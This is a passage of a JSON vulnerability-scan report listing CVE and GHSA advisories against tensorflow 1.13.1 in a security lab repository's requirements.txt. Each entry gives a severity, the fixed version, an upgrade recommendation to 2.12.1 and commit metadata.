            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35989 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35989](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35989)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2e031d563e1eb95ce982ecaa9c1b2f5f1c1d1188"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36027",
          "ruleIndex": 399,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36027 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36027](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36027)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ce4752c860738ec6a0ba203e7928e41ba0f9694f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35995",
          "ruleIndex": 400,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35995 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35995](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35995)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "50e6cf1860ab308229bea3019a294e3fe9948873"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35935",
          "ruleIndex": 401,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35935 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35935)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d1bc53bebeb0c0b5cffa79e37def135c120e164e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35939",
          "ruleIndex": 402,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35939 (severity: high, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35939](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35939)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9e3aadd1d4e276d5810977b362a3b96df5b78df8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-36004",
          "ruleIndex": 403,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-36004 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-36004](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36004)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1f1d75b2989ec78cb8429fd35a45b496b753a692"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-35964",
          "ruleIndex": 404,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-35964 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-35964](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35964)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e51bce7fec6fb6dbd78551511f442ea156638b10"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41885",
          "ruleIndex": 405,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41885 (severity: medium, fixed in 2.9.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41885](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41885)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2591e55dfa9e949fbdaee98ee07930bfe22a7880"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41909",
          "ruleIndex": 406,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41909 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41909](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41909)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9c25cce1ec1f1ef889f95f0924eddb46f0c19e0a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41897",
          "ruleIndex": 407,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41897 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41897](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41897)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "827a41784691c62453ad86e45f41b82ede50cd47"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41893",
          "ruleIndex": 408,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41893 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41893](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41893)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "bbe8136ed08be556371963d25566a593c62b7751"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41911",
          "ruleIndex": 409,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41911 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41911](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41911)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0809213eba22c171e6c0135b8d73b259875e8bcd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41896",
          "ruleIndex": 410,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41896 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41896](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41896)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "61dc46da9c2f2cecbab8019fd85eda21bffe2fba"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-xf83-q765-xm6m",
          "ruleIndex": 411,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability GHSA-xf83-q765-xm6m (severity: low, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [GHSA-xf83-q765-xm6m](https://github.com/advisories/GHSA-xf83-q765-xm6m)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "61765f433614531171ece2bc63b246f12313d4c6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41890",
          "ruleIndex": 412,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41890 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41890](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41890)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "52f8ffbf4349dd8d6a8c31f1a72de3555283a3de"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41884",
          "ruleIndex": 413,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-41884 (severity: medium, fixed in 2.10.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-41884](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41884)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "59e05058659cb7e5add8cedb41783f951a87b443"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-41899",
          "ruleIndex": 414,
          "level": "warning",
          "message": {
